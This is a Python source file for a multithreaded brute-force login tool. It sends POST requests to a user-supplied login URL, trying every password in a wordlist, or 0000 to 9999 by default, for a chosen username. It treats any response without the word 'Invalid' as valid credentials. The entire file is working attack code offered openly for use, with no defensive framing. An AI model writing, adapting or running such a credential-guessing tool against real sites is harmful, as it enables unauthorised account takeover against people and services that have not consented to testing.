import requests
import pyfiglet
import threading

def print_banner():
    banner = pyfiglet.figlet_format("Brute Force Login \n by HammadTahir")
    print(banner)
    print("A simple tool to brute force login credentials.\n")

url = ""
username = ""
password_list = []
valid_credentials = []
stop_event = threading.Event()

def user_input():
    global url, username, password_list
    url = input("Enter the URL of the login page (e.g., http://example.com/login): ")
    username = input("Enter the username to brute force: ")

    word_list_option = input("Do you want to use a custom wordlist? (y/n): ").strip().lower()

    if word_list_option == "y":
        word_list_path = input("Enter the path to the wordlist file: ").strip()
        try:
            with open(word_list_path, 'r') as file:
                password_list = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"[-] Error: The file '{word_list_path}' was not found.")
            exit(1)
    else:
        print("Using default password list (0000 to 9999)...")
        # Generate a list of passwords from 0000 to 9999
        password_list = [str(i).zfill(4) for i in range(10000)]


def request_sender(chunk):
    for password in chunk:
        if stop_event.is_set():
            break
        data = {
            "username": username,
            "password": password
        }
        try:
            response = requests.post(url, data=data)
            if "Invalid" not in response.text:
                msg = f"[+] Valid credentials found: {username}:{password}"
                print(msg)
                valid_credentials.append(msg)
                stop_event.set()  
            else:
                print(f"[-] Attempted: {password}")
        except requests.RequestException as e:
            print(f"[-] Error with request for password '{password}': {e}")

def list_chunker(lst, chunk_size=100):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), chunk_size):
        yield lst[i:i + chunk_size]

def main():
    print_banner()
    user_input()
    threads = []
    print(f"[+] Starting brute force attack on {url} with username '{username}'...")
    for chunk in list_chunker(password_list, chunk_size=100):
        t = threading.Thread(target=request_sender, args=(chunk,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    if valid_credentials:
        print("\n[+] Valid credentials found:")
        for cred in valid_credentials:
            print(cred)
if __name__ == "__main__":
    main()
